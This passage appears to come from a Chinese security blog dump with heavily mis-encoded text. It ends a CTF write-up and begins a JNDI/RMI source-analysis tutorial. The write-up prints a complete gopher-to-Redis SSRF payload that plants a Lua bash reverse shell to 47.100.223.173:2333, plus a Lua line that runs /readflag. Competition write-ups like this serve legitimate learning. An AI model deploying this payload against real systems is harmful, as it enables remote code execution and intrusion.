gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2493%0D%0A%0A%0A%23%23LUA_START%23%23os.execute%28%22bash%20-c%20%27sh%20-i%20%26%3E/dev/tcp/47.100.223.173/2333%200%3E%261%27%22%29%23%23LUA_END%23%23%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%248%0D%0A/scripts%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A è¿™é‡Œå°±åªéœ€è¦æ”¹ä¸€ä¸‹æ–‡ä»¶åä»¥åŠé•¿åº¦ï¼š\n1 2 3 gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2493%0D%0A%0A%0A%23%23LUA_START%23%23os.execute%28%22bash%20-c%20%27sh%20-i%20%26%3E/dev/tcp/47.100.223.173/2333%200%3E%261%27%22%29%23%23LUA_END%23%23%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%248%0D%0A/scripts%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename% .. ............ 0D%0A%2412%0D%0Avisit.script%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A æ”¹çš„åœ°æ–¹ç”¨ç‚¹æ ‡è®°å‡ºæ¥äº†ï¼Œå°±æ˜¯æ”¹äº†ä¸€ä¸‹æ–‡ä»¶åä»¥åŠé•¿åº¦ã€‚\nç„¶åå°†æ”¹äº†åçš„payload å†URLç¼–ç ä¸€ä¸‹å‘åŒ…å³å¯ï¼š\nç¬¬ä¸€æ¬¡å‘åŒ…ï¼š\nç„¶åå†ç¬¬äºŒæ¬¡å‘åŒ…ï¼Œç‚¹ä¸€ä¸‹sendå³å¯ï¼ŒæˆåŠŸå¼¹ä¸Šshellï¼š\nç„¶åå†æ‰§è¡Œreadflagæ–‡ä»¶å³å¯ï¼š\næœ€åæˆåŠŸå¾—åˆ°flagã€‚\nè¿™é‡Œè¿˜æœ‰é˜Ÿå‹æ‰“çš„ç”¨äºç›´æ¥æ‰§è¡Œç„¶åå›æ˜¾åˆ°å½“å‰é¡µé¢ä¸Šçš„luaæ‰§è¡Œå‘½ä»¤ï¼š\n1 2 3 ##LUA_START## ngx.say(io.popen(\u0026#34;/readflag\u0026#34;):read(\u0026#34;*all\u0026#34;)) ##LUA_END## â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\n","date":"2025-02-05T13:05:10+08:00","permalink":"https://fupanc-w1n.github.io/p/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B2025wp/","title":"è½¯ä»¶ç³»ç»Ÿå®‰å…¨èµ›2025wp"},{"content":"JNDI æ¦‚è¿° Java Naming Directory Interfaceï¼ŒJavaå‘½åå’Œç›®å½•æ¥å£ï¼Œæ˜¯SUNå…¬å¸æä¾›çš„ä¸€ç§æ ‡å‡†çš„Javaå‘½åç³»ç»Ÿæ¥å£ã€‚\né€šè¿‡è°ƒç”¨JNDIçš„APIåº”ç”¨ç¨‹åºå¯ä»¥å®šä½èµ„æºå’Œå…¶ä»–ç¨‹åºå¯¹è±¡ã€‚\nJNDIå¯è®¿é—®çš„ç°æœ‰ç›®å½•åŠæœåŠ¡åŒ…æ‹¬ï¼šJDBCï¼ˆJavaæ•°æ®åº“è¿æ¥ï¼‰ã€LDAPï¼ˆè½»å‹ç›®å½•è®¿é—®åè®®ï¼‰ã€RMIï¼ˆè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼‰ã€DNSï¼ˆåŸŸåæœåŠ¡ï¼‰ã€NIDï¼ˆç½‘ç»œä¿¡æ¯æœåŠ¡ï¼‰ã€CORBAï¼ˆå…¬å‘Šå¯¹è±¡è¯·æ±‚ä»£ç ç³»ç»Ÿç»“æ„ï¼‰ç­‰ã€‚\nå‘½åæœåŠ¡/ç›®å½•æœåŠ¡ å‰é¢æåˆ°æœ‰å‘½åæœåŠ¡/ç›®å½•æœåŠ¡ï¼Œç®€å•äº†è§£ä¸€ä¸‹\nJNDIåŒ…æ‹¬å‘½åæœåŠ¡ï¼ˆNaming Serviceï¼‰å’Œç›®å½•æœåŠ¡ï¼ˆDirectory Serrviceï¼‰ã€‚\nå‘½åæœåŠ¡ï¼šä¸€ç§é€šè¿‡åç§°æ¥æŸ¥æ‰¾å®é™…å¯¹è±¡çš„æœåŠ¡ã€‚ä¾‹å¦‚RMIä¸­,Naming.lookupæ–¹æ³•é€šè¿‡æŸ¥æ‰¾åç§°æ¥è·å–è¿œç¨‹å¯¹è±¡çš„ä»£ç†ç±»ã€‚\nç›¸å…³æ¦‚å¿µï¼š\nNameï¼šåç§°ã€‚è¦åœ¨å‘½åç³»ç»Ÿä¸­æŸ¥æ‰¾å¯¹è±¡ï¼Œéœ€è¦æä¾›å¯¹è±¡çš„åç§° Naming Conventionï¼šå‘½åè§„èŒƒã€‚ä¸€ä¸ªå‘½åç³»ç»Ÿä¸­çš„æ‰€æœ‰åç§°å¿…é¡»éµå¾ªçš„è¯­æ³•è§„èŒƒ Bindingï¼šç»‘å®šã€‚ä¸€ä¸ªåç§°å’Œä¸€ä¸ªå¯¹è±¡çš„å…³è” Referenceï¼šå¼•ç”¨ã€‚ä¸€äº›å‘½åæœåŠ¡ç³»ç»Ÿä¸æ˜¯ç›´æ¥å­˜å‚¨å¯¹è±¡ï¼Œè€Œæ˜¯ä¿å­˜å¯¹è±¡çš„å¼•ç”¨ã€‚å¼•ç”¨åŒ…å«äº†å¦‚ä½•è®¿é—®å®é™…å¯¹è±¡çš„ä¿¡æ¯ã€‚ Addressï¼šåœ°å€ã€‚å¼•ç”¨é€šå¸¸ç”¨ä¸€ä¸ªæˆ–å¤šä¸ªåœ°å€ï¼ˆé€šä¿¡ç«¯å£ï¼‰æ¥è¡¨ç¤º Contextï¼šä¸Šä¸‹æ–‡ã€‚ä¸€ä¸ªä¸Šä¸‹æ–‡æ˜¯ä¸€ç³»åˆ—åç§°å’Œå¯¹è±¡çš„ç»‘å®šçš„é›†åˆã€‚ä¸€ä¸ªä¸Šä¸‹æ–‡ä¸­çš„åç§°å¯ä»¥ç»‘å®šåˆ°ä¸€ä¸ªå…·æœ‰ç›¸åŒå‘½åè§„èŒƒçš„ä¸Šä¸‹æ–‡ä¸­ï¼Œæˆä¸ºå­ä¸Šä¸‹æ–‡ï¼ˆsubcontextï¼‰ã€‚ä¾‹å¦‚ï¼šåœ¨æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œ/usræ˜¯ä¸€ä¸ªContextï¼Œ/usr/binæ˜¯usrçš„subcontextã€‚ Naming Systemï¼šå‘½åç³»ç»Ÿã€‚ä¸€ä¸ªç›¸åŒç±»å‹çš„ä¸Šä¸‹æ–‡é›†åˆ Namespaceï¼šå‘½åç©ºé—´ã€‚ä¸€ä¸ªå‘½åç³»ç»Ÿçš„æ‰€æœ‰åç§°çš„é›†åˆ Atomic Nameï¼šåŸå­åã€‚ä¸€ä¸ªç®€å•åŸºæœ¬ç»“æ„ Compound Nameï¼šæ··åˆåã€‚ç”±å¤šä¸ªåŸå­åä¸€èµ·æ„æˆçš„åç§° Composite Nameï¼šå¤åˆåç§°ã€‚æ˜¯è·¨è¶Šå¤šä¸ªå‘½åç³»ç»Ÿçš„åç§° ç›®å½•æœåŠ¡ï¼šæ˜¯å‘½åæœåŠ¡çš„æ‰©å±•ï¼Œé™¤äº†æä¾›åç§°å’Œå¯¹è±¡çš„å…³è”ï¼Œè¿˜å…è®¸å¯¹è±¡å…·æœ‰å±æ€§ã€‚ç›®å½•æœåŠ¡ä¸­çš„å¯¹è±¡ç§°ä¹‹ä¸ºç›®å½•å¯¹è±¡ï¼Œç›®å½•å¯¹è±¡å¯ä»¥è·Ÿå±æ€§å…³è”ï¼Œä¸€ä¸ªç›®å½•æ˜¯ç”±ç›¸å…³è”çš„ç›®å½•å¯¹è±¡ç»„æˆçš„ç³»ç»Ÿã€‚ç›®å½•æœåŠ¡æä¾›åˆ›å»ºã€æ·»åŠ ã€åˆ é™¤ç›®å½•å¯¹è±¡ä»¥åŠä¿®æ”¹ç›®å½•å¯¹è±¡å±æ€§ç­‰æ“ä½œã€‚\nç›¸å…³æ¦‚å¿µï¼š\nAttributeï¼šå±æ€§ã€‚ä¸€ä¸ªç›®å½•å¯¹è±¡å¯ä»¥åŒ…å«å±æ€§ã€‚ä¸€ä¸ªå±æ€§å…·æœ‰ä¸€ä¸ªå±æ€§æ ‡è¯†ç¬¦å’Œä¸€ç³»åˆ—å±æ€§å€¼ã€‚ Search Filterï¼šæŸ¥æ‰¾è¿‡æ»¤å™¨ã€‚é€šå¸¸è¿˜æä¾›é€šè¿‡ç›®å½•å¯¹è±¡çš„å±æ€§æ¥æŸ¥æ‰¾å¯¹è±¡çš„æ“ä½œã€‚ é‡ç‚¹è¯´æ˜ è¿˜æœ‰å‡ ä¸ªç‚¹éœ€è¦è¯´æ˜ä¸€ä¸‹ï¼Œ\nå‰é¢æ¦‚å¿µä¸­é‡ç‚¹æ ‡æ³¨å‡ºæ¥çš„å‡ ä¸ªç‚¹ï¼Œç°åœ¨å†ç¨å¾®è¯´æ˜ä¸€ä¸‹ï¼š\nReferenceå¼•ç”¨ï¼Œé‡ç‚¹å°±æ˜¯ä¸Šé¢æ ‡æ³¨å‡ºæ¥çš„è¯´æ˜ã€‚\nContextï¼ˆä¸Šä¸‹æ–‡ï¼‰ï¼šæ‰€è°“ä¸Šä¸‹æ–‡ï¼Œæ˜¯ä½ å½“å‰æ‰§è¡Œç¨‹åºçš„ä¸€ä¸ªç¯å¢ƒï¼Œå­˜å‚¨äº†ç³»ç»Ÿçš„ä¸€äº›åˆå§‹åŒ–ä¿¡æ¯ã€‚\nå°±æ¯”å¦‚å­¦ä¹ Tomcatå†…å­˜é©¬æ—¶ï¼Œæåˆ°çš„ä¸€ä¸ªStandardContextå¯¹è±¡ï¼Œå½“æ—¶å°±æ˜¯ä¸ºäº†é€šè¿‡è¿™ä¸ªå¯¹è±¡æ¥è·å–åˆ°å½“å‰åº”ç”¨çš„ä¿¡æ¯ï¼Œå³è¿™å¯¹è±¡å¯ä»¥çœ‹ä½œå½“å‰webç¨‹åºçš„â€œèµ„æºâ€ã€‚\nJNDIä¹Ÿä¸€æ ·ï¼Œæä¾›äº†InitialContextå¯¹è±¡æ¥ä¸ºæˆ‘ä»¬è·å–å‘½åæœåŠ¡èµ„æºï¼Œæä¾›InitialDirContextå¯¹è±¡æ¥ä¸ºæˆ‘ä»¬è·å–ç›®å½•æœåŠ¡èµ„æºã€‚\nè¿˜æœ‰ä¸€ä¸ªContextç±»ï¼š\nContextæ¥å£ï¼šå‘½åæœåŠ¡åœ¨åˆå§‹åŒ–ä¸Šä¸‹æ–‡ä¸­ï¼Œæˆ‘ä»¬å°±ç”¨åˆ°äº†Contextæ¥å£ä¸­å®šä¹‰çš„å˜é‡ï¼Œåˆ†åˆ«ç”¨åˆ°äº†INITIAL_CONTEXT_FACTORYå’ŒPROVIDER_URLã€‚ INITIAL_CONTEXT_FACTORYï¼šä¿å­˜ç¯å¢ƒå±æ€§åç§°çš„å¸¸é‡ï¼Œç”¨äºæŒ‡å®šè¦ä½¿ç”¨çš„åˆå§‹ä¸Šä¸‹æ–‡å·¥å‚ã€‚è¯¥å±æ€§çš„å€¼åº”è¯¥æ˜¯å°†åˆ›å»ºåˆå§‹ä¸Šä¸‹æ–‡çš„å·¥å‚ç±»å®Œå…¨é™å®šç±»åã€‚\nPROVIDER_URLï¼šä¿å­˜ç¯å¢ƒå±æ€§åç§°çš„å¸¸é‡ï¼Œç”¨äºæŒ‡å®šæœåŠ¡æä¾›è€…è¦ä½¿ç”¨çš„é…ç½®ä¿¡æ¯ã€‚è¯¥å±æ€§çš„å€¼åº”åŒ…å«ä¸€ä¸ªURLå­—ç¬¦ä¸²ã€‚\nJNDIæ¶æ„ç®€å•å­¦ä¹  JNDIæ¶æ„æä¾›äº†ä¸€ä¸ªæ ‡å‡†çš„ã€ä¸å‘½åç³»ç»Ÿæ— å…³çš„APIï¼Œè¿™ä¸ªAPIæ„å»ºåœ¨ç‰¹å®šäºå‘½åç³»ç»Ÿçš„é©±åŠ¨ç¨‹åºä¹‹ä¸Šã€‚è¿™ä¸€å±‚æœ‰åŠ©äºæŠŠåº”ç”¨ç¨‹åºå’Œå®é™…çš„æ•°æ®æºéš”ç¦»å¼€æ¥ï¼Œå› æ­¤æ— è®ºåº”ç”¨ç¨‹åºæ˜¯è®¿é—®LDAPã€RMIã€DNSè¿˜æ˜¯å…¶ä»–çš„ç›®å½•æœåŠ¡ï¼Œè¿™éƒ½æ²¡æœ‰å…³ç³»ã€‚æ¢å¥è¯è¯´ï¼ŒJNDIä¸ä»»ä½•ç‰¹å®šçš„ç›®å½•æœåŠ¡å®ç°æ— å…³ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»»ä½•ç›®å½•ï¼Œåªè¦æ‚¨æ‹¥æœ‰ç›¸åº”çš„æœåŠ¡æä¾›ç¨‹åºæ¥å£ï¼ˆæˆ–é©±åŠ¨ç¨‹åºï¼‰å³å¯ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\nå…¶å®å°±æ˜¯åœ¨RMIç­‰æœåŠ¡å¤–é¢å†å¥—äº†ä¸€å±‚APIï¼Œæ–¹ä¾¿è°ƒç”¨ã€‚\nJNDI-åè®®è½¬æ¢ å¦‚æœJNDIåœ¨lookupæ—¶æ²¡æœ‰æŒ‡å®šåˆå§‹åŒ–å·¥å‚åç§°ï¼Œä¼šè‡ªåŠ¨æ ¹æ®åè®®ç±»å‹åŠ¨æ€æŸ¥æ‰¾å†…ç½®çš„å·¥å‚ç±»ç„¶ååˆ›è¿˜èƒ½å¤„ç†å¯¹è±¡çš„æœåŠ¡è¯·æ±‚ã€‚\nJNDIé»˜è®¤æ”¯æŒè‡ªåŠ¨è½¬æ¢çš„åè®®æœ‰ï¼š\nåè®®åç§° åè®®URL Contextç±» DNSåè®® dns:// com.sun.jndi.url.dns.dnsURLContext RMIåè®® rmi:// com.sun.jndi.url.rmi.rmiURLContext LDAPåè®® ldap:// com.sun.jndi.url.ldap.ldapURLContext LDAPåè®® ldaps:// com.sun.jndi.url.ldaps.ldapsURLContextFactory IIOPå¯¹è±¡è¯·æ±‚ä»£ç†åè®® iiop:// com.sun.jndi.url.iiop.iiopURLContext IIOPå¯¹è±¡è¯·æ±‚ä»£ç†åè®® iiopname:// com.sun.jndi.url.iiopname.iiopnameURLContextFactory IIOPå¯¹è±¡è¯·æ±‚ä»£ç†åè®® corbaname:// com.sun.jndi.url.corbaname.corbanameURLContextFactory ä»¥åé¢çš„RMIä»£ç ç‰‡æ®µä¸ºä¾‹ï¼š\n1 2 3 4 5 6 // åˆ›å»ºJNDIç›®å½•æœåŠ¡ä¸Šä¸‹æ–‡ InitialContext context = new InitialContext(); // æŸ¥æ‰¾JNDIç›®å½•æœåŠ¡ç»‘å®šçš„å¯¹è±¡ RemoteInterface o = (RemoteInterface)context.lookup(\u0026#34;rmi://127.0.0.1:1099/Hello\u0026#34;); System.out.println(o.sayHello()); è¿™é‡Œä¹Ÿä¼šå¯ä»¥æˆåŠŸè°ƒç”¨ä¸€ä¸ªsayHello()æ–¹æ³•ï¼š\næœ¬æ¥lookupè¿™é‡Œåªéœ€è¦ä¼ å‚â€œHello\u0026quot;å³å¯ï¼Œä½†æ˜¯å°±éœ€è¦è¿›è¡Œç¯å¢ƒé…ç½®ï¼Œè¿™æ ·ä¼ å…¥ä¹Ÿèƒ½æ­£å¸¸è·å–ä»£ç†å¯¹è±¡å¹¶è°ƒç”¨æ–¹æ³•ï¼Œè¿™å¾—ç›Šäºè¿™é‡Œçš„lookup()ä¼šåŠ¨æ€åœ°è¯†åˆ«ç”¨æˆ·è¦è°ƒç”¨çš„æœåŠ¡ä»¥åŠè·¯å¾„ï¼Œç„¶åå°±ä¼šè‡ªåŠ¨ä½¿ç”¨rmiURLContextå¤„ç†RMIè¯·æ±‚ï¼Œä¹Ÿæ˜¯åœ¨jndiæ³¨å…¥ä¸­æ¯”è¾ƒå¸¸ç”¨çš„ä¸€ç‚¹ã€‚\nJNDIçš„æ¥å£å®ç° æµ‹è¯•ç¯å¢ƒï¼š\nJDK 8u71 JNDI-RMIæœåŠ¡ RMIçš„æœåŠ¡å¤„ç†å·¥å‚ç±»æ˜¯ï¼šcom.sun.jndi.rmi.registry.RegistryContextFactoryï¼Œåœ¨è°ƒç”¨è¿œç¨‹çš„RMIæ–¹æ³•ä¹‹å‰éœ€è¦å…ˆå¯åŠ¨RMIæœåŠ¡ï¼Œç„¶åå°±å¯ä»¥ä½¿ç”¨JNDIæ¥è¿æ¥å¹¶è°ƒç”¨äº†ã€‚\nåŸºæœ¬ä»£ç  å…ˆå¼€å¯ä¸€ä¸ªRMIæœåŠ¡ï¼Œç›´æ¥ç”¨ä¹‹å‰çš„ä»£ç å³å¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package Rmi.Server; import java.rmi.Naming; import java.rmi.registry.LocateRegistry; public class RMIServer{ public static void main(String[] args){ try { //åˆ›å»ºæ³¨å†Œä¸­å¿ƒ LocateRegistry.createRegistry(1099); System.out.println(\u0026#34;Server start\u0026#34;); //ç»‘å®šè°ƒç”¨ç±» RemoteInterface remoteTest = new RemoteTest(); Naming.bind(\u0026#34;rmi://localhost:1099/Hello\u0026#34;,remoteTest); }catch(Exception e){ e.printStackTrace(); } } } åœ¨è®¿é—®JNDIç›®å½•æœåŠ¡æ—¶ä¼šé€šè¿‡é¢„å…ˆè®¾ç½®å¥½ç¯å¢ƒå˜é‡è®¿é—®å¯¹åº”çš„æœåŠ¡ï¼š\n1 2 3 Hashtable env = new Hashtable(); env.put(Context.INITIAL_CONTEXT_FACTORY,\u0026#34;com.sun.jndi.rmi.registry.RegistryContextFactory\u0026#34;); env.put(Context.PROVIDER_URL, \u0026#34;rmi://localhost:1099\u0026#34;); ç®€å•ç†è§£å°±æ˜¯é€šè¿‡Context.INITIAL_CONTEXT_FACTORYå‘Šè¯‰JNDIæˆ‘è¦è®¿é—®ä½•ç§æœåŠ¡ï¼Œé€šè¿‡Context.PROVIDER_URLå‘Šè¯‰JNDIæ‰€è¦è®¿é—®æœåŠ¡çš„è·¯å¾„ã€‚\nç„¶åå°±æ˜¯åˆå§‹åŒ–ä¸Šä¸‹æ–‡ï¼Œä¼ å…¥æˆ‘ä»¬è®¾ç½®å¥½çš„ç¯å¢ƒå˜é‡ï¼š\n1 Context initialContext = new InitialContext(env); è¿˜æœ‰å¦å¤–ä¸€ç§ç±»ä¼¼çš„è·å–ä¸Šä¸‹æ–‡çš„æ“ä½œï¼Œå³ä¸æŒ‡å®šç¯å¢ƒå˜é‡ï¼Œé‚£ä¹ˆJNDIä¼šè‡ªåŠ¨æœç´¢ç³»ç»Ÿå±æ€§System.getProperty()ã€appletå‚æ•°å’Œåº”ç”¨ç¨‹åºèµ„æºæ–‡ä»¶jndi.propertiesï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡System.setProperty()è®¾ç½®ç¯å¢ƒå˜é‡ï¼š\n1 2 3 4 System.setProperty(Context.INITIAL_CONTEXT_FACTORY,\u0026#34;com.sun.jndi.rmi.registry.RegistryContextFactory\u0026#34;); System.setProperty(Context.PROVIDER_URL,\u0026#34;rmi://localhost:1099\u0026#34;); InitialContext initialContext = new InitialContext(); ç„¶ååˆ©ç”¨æä¾›çš„lookup()æ–¹æ³•ï¼Œé€šè¿‡æŸ¥è¯¢åå­—è·å–è¿œç¨‹å¯¹è±¡ä»£ç†ç±»ï¼š\n1 2 3 4 //è·å–è¿œç¨‹ä»£ç†ç±» RemoteInterface o = (RemoteInterface) initialContext.lookup(\u0026#34;Hello\u0026#34;); //è°ƒç”¨è¿œç¨‹å¯¹è±¡çš„æ–¹æ³• System.out.println(o.sayHello()); æ‰€ä»¥å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package JNDI; import java.util.Hashtable; import javax.naming.Context; import Rmi.Server.RemoteInterface; import javax.naming.InitialContext; public class JNDI_Main { public static void main(String[] args) throws Exception { Hashtable env = new Hashtable(); env.put(Context.INITIAL_CONTEXT_FACTORY,\u0026#34;com.sun.jndi.rmi.registry.RegistryContextFactory\u0026#34;); env.put(Context.PROVIDER_URL, \u0026#34;rmi://localhost:1099\u0026#34;); Context initialContext = new InitialContext(env); //è·å–è¿œç¨‹ä»£ç†ç±» RemoteInterface o = (RemoteInterface) initialContext.lookup(\u0026#34;Hello\u0026#34;); //è°ƒç”¨è¿œç¨‹å¯¹è±¡çš„æ–¹æ³• System.out.println(o.sayHello()); } } æˆåŠŸè°ƒç”¨æ–¹æ³•ï¼š\næºç åˆ†æ å‘½åæœåŠ¡åˆå§‹åŒ–ä¸Šä¸‹æ–‡ å¯¹åº”ä»£ç ä¸ºï¼š\n1 Context initialContext = new InitialContext(env); æœ‰å‰é¢çš„ä»£ç å¯ä»¥çœ‹å‡ºï¼Œè¿™é‡Œæˆ‘ä»¬æ˜¯ä¼ å…¥äº†ä¸€ä¸ªHashtableç±»ï¼Œé‡Œé¢åŒ…å«äº†æ„é€ çš„ä¸¤ä¸ªé”®å€¼å¯¹ã€‚çœ‹çœ‹ä¼šå¯¹è¿™ä¸ªè¿›è¡Œä»€ä¹ˆå¤„ç†è·Ÿè¿›ä¸€ä¸‹è¿™é‡Œçš„InitialContextç±»çš„æ„é€ æ–¹æ³•ï¼ˆæ³¨æ„è¦å…ˆå¯åŠ¨RMIçš„Serverç«¯ï¼‰ï¼š\nå¦‚é¢„æœŸï¼Œæœ‰é”®å€¼å¯¹ï¼Œè¿™é‡Œçš„clone()æ–¹æ³•ç®€å•æ¥è¯´å°±æ˜¯ä¸€ä¸ªæ‹·è´çš„æ“ä½œï¼Œå…¶å®è°ƒç”¨è¿™ä¸ªæ–¹æ³•åçš„Hashtableç±»ä¸åŸå…ˆæ²¡æœ‰å¤ªå¤§åŒºåˆ«ï¼Œè¿™ä¸ªæ–¹æ³•åçš„environmentå‚æ•°ä¹Ÿæ˜¯æ²¡æœ‰é—®é¢˜çš„ã€‚\nç„¶åè°ƒç”¨äº†init()æ–¹æ³•ï¼Œå¹¶å¾€é‡Œé¢ä¼ è¿›äº†environmentï¼Œè·Ÿè¿›è¿™ä¸ªæ–¹æ³•ï¼š\nç„¶åè¿™é‡Œè°ƒç”¨äº†ResourceManager#getInitialEnvironment()æ–¹æ³•ï¼Œç®€å•è·Ÿè¿›ä¸€ä¸‹ï¼Œå‡ ä¸ªé‡ç‚¹ä»£ç ï¼š\nè·å–appletå‚æ•°çš„ä»£ç ï¼š\nä¸¤ä¸ªç‚¹ï¼Œ\nç¬¬ä¸€ä¸ªæ¡†ï¼Œè·å–åˆ°VersionHelperç±»çš„PROPSå˜é‡ï¼Œå˜é‡å®šä¹‰å¦‚ä¸‹ï¼š é‡Œé¢å°±æœ‰æˆ‘ä»¬åŸå…ˆæ”¾å…¥çš„ä¸¤ä¸ªå˜é‡ï¼Œè¿™ä¸ªå˜é‡è®°å½•äº†Contextæ¥å£çš„å¸¸é‡ä¿¡æ¯ï¼Œæ‰€ä»¥ç°åœ¨å°±æ˜¯å°†propså˜é‡èµ‹å€¼ä¸ºäº†ä¸Šé¢çš„åŒ…å«Contextæ¥å£å¸¸é‡ä¿¡æ¯çš„æ•°ç»„\nç¬¬äºŒä¸ªæ¡†ï¼Œå°±æ˜¯ä»Hashtableä¸­è·å–ä»¥APPLETå˜é‡ä¸ºå€¼çš„é”®çš„å€¼ï¼Œåœ¨Contextæ¥å£ä¸­çš„APPLETå˜é‡å®šä¹‰ï¼š å¾ˆæ˜æ˜¾æˆ‘ä»¬å½“åˆå¹¶æ²¡æœ‰å¾€Hashtableç±»æ”¾å…¥è¿™ä¸ªå˜é‡ï¼Œæ‰€ä»¥è¿™é‡Œå°±æ˜¯ä¸€ä¸ªç©ºï¼Œå³ä¸ºnullã€‚\nç»§ç»­å¾€åé¢çœ‹ï¼Œä»£ç å¦‚ä¸‹ï¼š\nè¿™é‡Œçš„helperå˜é‡å®šä¹‰ï¼š\nè·Ÿè¿›VersionHelper#getVersionHelper()æ–¹æ³•ï¼š\næ‰€ä»¥å…¶å®ä¹Ÿå°±æ˜¯è·å–åˆ°VersionHelper12ç±»å®ä¾‹ã€‚æ‰€ä»¥åœ¨å‰é¢çš„æ–¹æ³•è°ƒç”¨ä¸­ï¼Œå…¶å®æ˜¯ä¼šè°ƒç”¨VersionHelper12ç±»çš„getJndiProperties()æ–¹æ³•ï¼Œç®€å•çœ‹äº†ä¸€ä¸‹ï¼Œå¾ˆåƒåœ¨è°ƒç”¨System.getProperty()æ–¹æ³•ï¼Œè¿™é‡Œä¼šè¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œç»“æœå…¨ä¸ºnullï¼š\nç„¶åå°±è°ƒç”¨äº†forå¾ªç¯ï¼Œå‡ ä¸ªå…³é”®ç‚¹ï¼š\nè¿™é‡Œå°±æ˜¯è°ƒç”¨äº†å‰é¢çš„æ•°ç»„ï¼Œå¦‚æœåœ¨Hashtableç±»ä¸­å­˜åœ¨æ•°ç»„ä¸­çš„ä¸€ä¸ªå€¼ï¼Œé‚£ä¹ˆå°±ç›´æ¥è¿›å…¥ä¸‹ä¸€ä¸ªforå¾ªç¯ï¼Œå¯ä»¥æƒ³å‡ºåªä¼šæœ‰ä¸¤æ¬¡æ“ä½œæ˜¯ç›´æ¥è¿›å…¥ä¸‹ä¸€ä¸ªforå¾ªç¯ï¼Œé‚£ä¹ˆæ²¡æœ‰å®šä¹‰çš„å‘¢ï¼Œå°±ä¼šè¿›å…¥åˆ°ifæ¡ä»¶è¯­å¥ï¼Œå¹¶ä¸”åœ¨å‰é¢å¯ä»¥çŸ¥é“è·å–åˆ°çš„appletå˜é‡ä¸ºnullï¼Œæ‰€ä»¥å…¶å®å°±æ˜¯è°ƒç”¨çš„ä¸‹é¢çš„ä»£ç ï¼š\næ²¡å•¥å¤§çš„åˆ†æè¿‡ç¨‹ï¼Œæœ€åè¿˜æ˜¯è¿”å›çš„è¿™ä¸ªHashtableç±»ï¼š\nå¯èƒ½æ˜¯å› ä¸ºæˆ‘æŒ‡å®šäº†ç¯å¢ƒå˜é‡ï¼Œæ²¡æœ‰ä½¿ç”¨setProperty()æ–¹æ³•æ¥æ”¾å˜é‡ã€‚å¯ä»¥æ¢ä»£ç å†è·Ÿä¸€ä¸‹ï¼Œè¿‡ç¨‹æœ‰ç»†å¾®å·®åˆ«ï¼Œä½†ä¸å½±å“ï¼Œæœ€ååœ¨jndiSysPropså˜é‡çš„èµ‹å€¼ç¡®å®æœ‰ä¸åŒï¼š å¤§å·®ä¸å·®ï¼Œå°±æ˜¯å‰é¢ä¼šå®ä¾‹åŒ–ä¸€ä¸ªHashtableç±»ï¼Œåé¢ä¼šè°ƒç”¨Hashtableç±»çš„put()æ–¹æ³•\nè¿˜æ˜¯ä¼šæ„é€ æˆä¸€ä¸ªHashtableç±»ã€‚\næ‰€ä»¥æœ€ç»ˆç»“æœè¿˜æ˜¯è¿™ä¸ªHashtableç±»ï¼š\nResourceManager#getInitialEnvironment()æ–¹æ³•åˆ†æç»“æŸã€‚\næ‰€ä»¥è¿™ä¸ªæ­¥éª¤çš„ç›®çš„å°±æ˜¯ç¡®ä¿åé¢èƒ½ä¼ å…¥ä¸€ä¸ªâ€œå¡«å……â€å¥½çš„Hashtableç±»ã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”\nå›åˆ°InitialContextç±»çš„init()æ–¹æ³•ï¼Œå†ç²˜è¿‡æ¥ä¸€æ¬¡ä»£ç ï¼š\nç„¶ååé¢æ— ç–‘ä¼šè°ƒç”¨getDefaultInitCtx()æ–¹æ³•ï¼š æ‰€ä»¥ç°åœ¨ä¼šè°ƒç”¨NamingManagerç±»çš„getInitialContext()æ–¹æ³•ï¼Œå¹¶ä¼ å…¥äº†å‰é¢æ„é€ äº†çš„Hastableç±»ï¼Œè·Ÿè¿›è¿™ä¸ªæ–¹æ³•ï¼š\næŒ‰é¡ºåºè§£æä¸€ä¸‹è¿™ä¸ªæ–¹æ³•åœ¨å¹²å˜›ã€‚\né¦–å…ˆè°ƒç”¨äº†getInitialContextFactoryBuilder()æ–¹æ³•ï¼Œè·Ÿè¿›ä¸€ä¸‹ï¼š 